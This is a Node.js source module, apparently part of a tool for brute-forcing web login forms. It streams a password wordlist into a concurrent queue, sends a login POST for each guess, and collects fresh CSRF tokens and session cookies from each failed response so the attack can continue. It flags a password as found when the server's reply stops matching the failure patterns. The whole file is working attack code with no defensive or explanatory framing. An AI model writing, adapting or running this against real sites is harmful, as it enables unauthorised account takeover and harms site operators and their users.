var fs      = require('fs');
var es      = require('event-stream');
var async   = require('async');
var request = require('request');
var logger  = require('./logger.js');

// ================================================================================================
// Manage login attempts to target
// ================================================================================================

function launch(config, onSuccess, onFail) {
  var csrf  = require('./csrf.js')(config, onSuccess, onFail);
  var queue = async.queue(tryLogin, config.concurrency);

  queue.drain = function() {
    logger.info('Finished');
  };

  logger.info('Reading wordlist...');

  fs.createReadStream(config.wordlist)
    .on('error', function() {
      logger.error('Error reading file');
    })
    .on('end', function() {
      logger.info('Full wordlist read');
    })
    .pipe(es.split())
    .pipe(es.map(function(word) {
        queue.push(word);
      })
    );

  // ==============================================================================================
  // Private 
  // ==============================================================================================

  // Process server response to a login attempt
  function processLoginResponse(response, body, password) {
    
    // If we match known regex (can be multiple) password is incorrect
    var captureConfig = config.getAdvanced().capture;
    var loginFailures = captureConfig.loginRegex;
    var csrfRegex     = captureConfig.csrfRegex;

    if (response.statusCode === 200 && matchAny(loginFailures, body)) { 

      logger.info('Invalid: ' + password);
      
      csrf.collect(response, body, csrfRegex, function(token, cookieString) {
        csrf.tokenPool.push({ 
          token: token, 
          cookie: cookieString 
        });
      });

    } else if (response.statusCode < 400) {

      logger.info('FOUND: ' + password);
      logger.info('Shutting down....');
      onSuccess(password);

    } else {
      
      logger.warn('Server responded with: ' + response.statusCode);
      onFail();

    }
  }

  // Attempt to login with given password
  function tryLogin(password, callback) {

    csrf.fetch(function(token, cookieString) {
      var opt = config.getLogin(password, token, cookieString);

      // Send a login POST
      request(opt, function (error, response, body) {
        
        if (!error) { 
          processLoginResponse(response, body, password);
        } else {
          logger.error(error.toString());
        }
        
        callback();
      });
    });
  }
}

exports.launch = launch;

// ================================================================================================
// Helpers
// ================================================================================================

function matchAny(arrPatterns, sTarget) {
  for (var i = 0; i < arrPatterns.length; i++) {
    
    var re    = new RegExp(arrPatterns[i]);
    var match = sTarget.match(re);

    if (match) {
      return match;
    }
  }

  return null;

}